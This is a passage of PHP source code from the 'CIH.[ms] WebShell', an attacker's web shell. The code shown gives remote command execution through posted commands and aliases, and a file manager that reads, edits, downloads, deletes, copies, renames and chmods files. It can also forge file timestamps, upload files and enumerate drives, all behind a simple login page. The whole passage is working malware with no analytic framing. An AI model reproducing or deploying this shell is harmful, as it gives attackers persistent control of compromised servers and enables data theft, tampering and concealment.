echo " <textarea class='txt'  style='width:98%; height:60%; background:#262626' rows='30'>";if($safe_mode == 'On'){ echo "Safe mode is on..";}if(isset($_POST['alias'])){ foreach ($alias as $k=>$v) { if ($_POST['alias'] == $k){cmd_exec($v);}}} else {cmd_exec($safe_mode);}if(isset($_POST['cmdir'])) {$dirr = $_POST['cmdir'];} else {$dirr = $path;}echo "</textarea>";echo "<form method='post' action='' style='padding:0px; margin-top:5px; margin-bottom:15px;'><input type='hidden' name='do' value='shell'><input type='text'  name='cmd' value='";if (isset($_POST['cmd'])){echo $_POST['cmd'];} elseif ($os == 'win'){echo 'dir';} else{echo 'ls';}echo "'  class='form' style='width:98%; margin-bottom:2px;'><input type='text'  name='cmdir' value='$dirr'  class='form' style='color:#444;width:98%'><input type='submit' class='form' value='do' style='width:98%; margin-top:3px; border:0px; background:#262626;'></form>";echo"<form method='post' action='' style='border-top:1px solid #282828; margin:0px;'><select name='alias' class='form' style='width:98%; margin-top:5px;'>";foreach($alias as $k=>$v){echo "<option>$k</option>";}echo "</select><input type='hidden' name='do' value='shell'><input type='hidden' name='cmdir' value='$dirr'><input type='submit' class='form' value='do' style='width:98%; margin-top:3px; border:0px; background:#262626;'</form><br/><br/>";do_footer($ver);   die();break;
case 'cihshell':echo "<div class='str' style='text-align:center;'><table class='str' style='width:100%'><tr>
<td style='border-right:1px solid #333; width:200px;'><div style=' padding:50px; margin-top:50px; margin-bottom:50px; border-top:1px solid #333; border-bottom:1px solid #333;'>Coded by <b>Berkut</b>. <br/><br/>&copy; 2007 <br/><hr>Fixed by <b>DCRM</b>. <br/></br>&copy; 2008 <br/></div></td><td valign='top' style='padding-left:30px;'><br/><br/><span style='font-size:20px; color:#666;'>CIH.[ms] WebShell<sup style='font-size:12px; color:#444;'>&nbsp;v.$ver</sup></span><br/><br/><br/>It has so many strong points that it is impossible to write them here (:</td></tr></table></div>";do_footer($ver); die();break;
default: error('There is no such function',$ver);
break;}}
 # file actions
if(is_file($path))
  {$perms = fperms($path); $size = filesize($path."/".$file); $size = conv_size($size); $size_fix = conv_size(filesize($path));  $pp = $_POST['f_path'];$ppp = $_POST['f_file'];
echo "<div  style='padding:2px;'><div style='background:#292929; padding:10px; margin-bottom:3px; text-align:left;'><b>File actions</b></div><div style='background:#272727; padding:3px;  font-size:9px; text-align:left;'>file:&nbsp;<span style='color:#666;'>$path</span>&nbsp;&nbsp;|&nbsp;&nbsp; permissions: <b style='color:#666;'>$perms </b>&nbsp;&nbsp;|&nbsp;&nbsp; size: <span style='color:#666;'>$size_fix</span>&nbsp;&nbsp;|&nbsp;&nbsp; Create time: <span style='color:#666;'>".date("d.m.Y H:i:s",filectime($path))."</span>&nbsp;&nbsp;|&nbsp;&nbsp;Modify time: <span style='color:#666;'>".date("d.m.Y H:i:s",filemtime($path))."</span></div><table style='width:100%; font-size:10px;'><tr><td style='width:200px; border-right:1px solid #292929; vertical-align:top; padding:0px; padding-left:5px;'>      <form method='post' action=''><input type='hidden' name='ffile' value='$path'><input type='hidden' name='path' value='$path'><input type='hidden' name='curpath' value='$pp'><input type='hidden' name='filename' value='$ppp'><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='view' style=''></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa' name='fdo' value='view in HEX' style=''></div>       <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929; text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='edit'></div>       <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='preview' ></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa' name='fdo' value='download'></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:40px;'><input type='submit' class='fa1' name='fdo' value='delete'></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa1' name='fdo' value='copy' ></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='rename' ></div> <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='chmod' ></div> <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='touch' ></div></td><td style='padding:3px; vertical-align:top;'>";
 if (isset($_POST['fdo']) && isset($_POST['ffile'])){
$ffile = $_POST['ffile'];
switch($_POST['fdo']){
case 'view':
fileread2($ffile, $stringnum);
break;
case 'view in HEX':

$fi=fopen($path,"rb");
if ($fi) {$str = fread($fi,filesize($path));$n=0;$a0="00000000<br/>";$a1="";$a2="";
for ($i=0; $i<strlen($str); $i++) {$a1.=sprintf("%02X",ord($str[$i])).' ';switch (ord($str[$i])) {case 0:  $a2.="0"; break;case 32: case 10:case 13: $a2.="&nbsp;"; break;default:  $a2.=htmlspecialchars($str[$i]);}$n++;if ($n==$hexdump_rows) {$n=0;if ($i+1<strlen($str)) $a0.=sprintf("%08X",$i+1)."<br>";$a1.="<br>";$a2.="<br>";}}echo "<table style='font-size:10px;'><tr><td style='border-right:1px solid #292929; color:#444; padding:4px;'>$a0</td><td style='color:#666; padding:4px;'>$a1</td><td style='border-left:1px solid #292929; color:#444; padding:4px;'>$a2</td></tr>";echo"</table>";
}break;
case 'edit':
echo "<form method='post' action='' style='margin:0px; padding:0px;'><textarea cols='170' rows='34' class='txt' style='width:100%;' name='wrcont'> ";
fileread($ffile);echo "</textarea><input type='hidden' name='ffile' value='$ffile'><input type='hidden' name='path' value='".$path."'><input type='submit' name='wrfile' class='form' value='save file' style='width:100%; margin-top:5px;'></form><br/>"; break;
case 'chmod':
echo"<form method='post' action='' style='padding:0px; margin:0px;'><input type='hidden' name='path' value='".$_POST['curpath']."'><input type='text' name='chmod' class='form'  value='".substr(sprintf('%o', fileperms($path)), -4)."' style='width:10%'><span style='margin-left:4px; margin-right:4px;'>for</span><input type='text' name='ffile' class='form'  value='".$path."' style='width:70%'><input type='submit' style='width:60px;' class='form' value='change!'></form><br/>";break;

case 'touch':
echo"<form method='post' action='' style='padding:0px; margin:0px;'><input type='hidden' name='path' value='".$_POST['curpath']."'><input type='text' name='touch' class='form'  value='".date("d M Y H:i:s",filemtime($path))."' style='width:15%'><span style='margin-left:4px; margin-right:4px;'>for</span><input type='text' name='ffile' class='form'  value='".$path."' style='width:70%'><input type='submit' style='width:60px;' class='form' value='change!'></form><br/>";break;

case 'rename':
echo" <form method='post' action=''  style='padding:0px; margin:0px;'><input type='hidden' name='path' value='".$_POST['curpath']."'><input type='text' name='ffile' class='form'  value='".$path."' style='width:40%'><span style='margin-left:4px; margin-right:4px;'>to</span><input type='text' name='newname' class='form'  value='".$path."'  style='width:40%'><input type='submit' style='width:60px;' class='form' value='rename!'></form><br/>";break;
case 'copy':
echo"<form method='post' action=''  style='padding:0px; margin:0px;'><input type='hidden' name='path' value='".$_POST['curpath']."'><input type='text' name='ffile' class='form'  value='".$path."' style='width:40%'><span style='margin-left:4px; margin-right:4px;'>to</span><input type='text' name='newpath' class='form'  value='".$path."'  style='width:40%'><input type='submit' style='width:60px;' class='form' value='copy!'></form><br/>";break; }}
else {
$fh = fopen($path, 'r'); if (!$fh){error('Could not open file',$ver);}echo '<table style="font-size:10px;   width:100%; background:#222; ">';if ($stringnum){$i=1;while(!feof($fh) & $i<=30) {$line = fgets($fh);  echo '<tr style="background:#242424;"><td style="text-align:center;padding:3px; width:2%; border-right:1px solid #2e2e2e; color:#444;">'.$i.'</td><td>'.htmlspecialchars($line).'</td></tr>'; $i++;}}else {while(!feof($fh) & $i<=30) {$line = fgets($fh);  echo '<tr style="background:#242424;"><td>'.htmlspecialchars($line).'</td></tr>'; }}echo '</table>';}
echo '</td></tr></table></div>';do_footer($ver);die();}
elseif (is_dir($path))
 {
  $dirs=array();
  $files=array();
  $dir=opendir($path);
  while (($file=readdir($dir))!==false) { if ($file=="." || $file=="..") continue;
         if (is_dir("$path/$file"))  {$dirs[]=$file;}
         else {$files[]=$file;}}closedir($dir);
  }

else {error('it isn\'t a directory', $ver);}
if (!$dir){error('An error occured while opening directory&nbsp;'.$path, $ver);}
sort($dirs);
sort($files);
echo "<table style='width:100%; background:#222;'>";
   echo "<tr><td colspan=6 class='filet' style='background:#282828; padding:0px; border-top:1px solid #2e2e2e; height:30px;'>";
# drives
   if ($os == "win") {
    echo "<form method='post' action='' style='padding:0px; margin:0px; float:left;'>";echo "<input type='button' value='Drives:' class='fm' style='font-weight:bold;'>";for($d='c';$d<='z';$d++){if(is_dir($d.":/"))echo "<input type='submit' value='".$d.":/' class='fm' name='path'>";  }echo "</form>";}echo "<form method='post' action='' style='padding:0px; margin:0px; float:right;' >";
echo "<input type='submit' name='diract' class='fm' value='directory actions' style='margin-bottom:0px; font-weight:bold; color:#666;'><input type='hidden' name='curdir' value='$path'><input type='hidden' name='cmdir' value='$path'><span style='color:#666;'>|</span><input type='submit' name='fileact'   value='New File' class='fm'><span style='color:#666;'>|</span><input type='submit'  style='margin:0px;' name='fileact' value='New Dir' class='fm'><span style='color:#666;'>|</span><input type='submit' name='fileact' value='Upload' class='fm'>";echo "</form>";
echo "</td></tr>";echo "<tr style='background:#272727;'><td  style='width:3%; '>&nbsp;</td><td style='width:300px; color:#888;' class='filet'><b>name</b></td><td class='filet' style='color:#888;'><b>size</b></td><td class='filet' style='color:#888;'><b>last modified</b></td><td class='filet' style='color:#888;'><b>permissions</b></td></tr>";echo "<form method='post' action=''><input type='hidden' name='f_path' value='$path'>";
for ($i=0; $i<count($dirs); $i++) {
$size = '---';
$perms = fperms($path."/".$dirs[$i]);
$ico = '<b>dir</b>';
$last_mod = date('d.m.y  H:i:s', fileatime($path."/".$file));if(!$last_mod){$last_mod = "---";}
echo" <tr style='background:#252525;'><td  class='ico'>[$ico]</td><td style='width:300px;'><input type='submit' name='f_file' class='dir' value='$dirs[$i]'></td><td class='filet'>$size</td><td class='filet'>$last_mod</td><td class='filet'>$perms </td></tr>";}

 for ($i=0; $i<count($files); $i++) {
# filesize
if (is_link($path."/".$files[$i])) {$size = "---";} else {$size = filesize($path."/".$files[$i]); $size = conv_size($size);  if($size == '0B'){$size = '---';} }
# date
$last_mod = date('d.m.y  H:i:s', fileatime($path."/".$files[$i]));if(!$last_mod){$last_mod = "---";}
#perms
$perms = fperms($path."/".$files[$i]);
#filetype (ico)
$ico = ''; if(is_link($path."/".$files[$i])) {$ico = 'link';}
else{
// filetypes for file manager
$filetypes  = array(
"php"=> array("php","phtml","php3","php4","inc"),
"exe"=>array("sh","install","bat","cmd"),
"ini"=>array("ini","inf"),
"html"=>array("html","htm","shtml"),
"txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg"),
"code"=>array("tcl","h","c","cpp", "pl", "cgi"),
"img"=>array("gif","png","jpeg","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
"sdb"=>array("sdb"),
"sess"=>array("sess"),
"dwnld"=>array("exe","com","pif","src","lnk","zip","rar")
);
$filename = $files[$i]; $ext = explode(".",$filename);$c = count($ext)-1;$ext = $ext[$c];$ext = strtolower($ext);$rft = "";foreach($filetypes as $key=>$value){if (in_array($ext,$value)) {$ico = $key; break;} } if($ico==''){$ico = 'none';}}
$wtf = '/'.$files[$i];if ($wtf == $_SERVER['SCRIPT_NAME']) {echo"<tr style='background:#292929;'><td  class='ico' style='color:#666;'>[shell]</td><td style='width:300px;'><input type='submit' style='background:#292929;' name='f_file' class='file' value='$files[$i]'></td><td class='filet'>$size</td><td class='filet'>$last_mod</td><td class='filet'>$perms </td></tr>";}
else {
echo"<tr style='background:#252525;'><td  class='ico'>[$ico]</td><td style='width:300px;'><input type='submit' name='f_file'  class='file' value='$files[$i]'></td><td class='filet'>$size</td><td class='filet'>$last_mod</td><td class='filet'>$perms </td></tr>";        }
}echo '</form></table><div style="padding-left:2px; padding-right:2px; padding-bottom:4px; background:#222;"><div class="filet" style="background:#272727; border-bottom:1px solid #2e2e2e">&nbsp</div></div>';do_footer($ver);}
else {echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style="margin-left:100px; margin-top:100px; background:#222; font-family:Verdana; font-size:10px; color:#999; padding:4px; width:100%:"><tr><td><form method="post" style="margin:0px; padding:)px;">login: <input type="text" name="login" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;password: <input type="text" name="password" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;<input type="submit"  style="color:#999; border:0px; font-size:10px; background:#262626; height:20px;; font-family:Verdana;" value="go"></form></td></tr></table></body></html>';}
?>
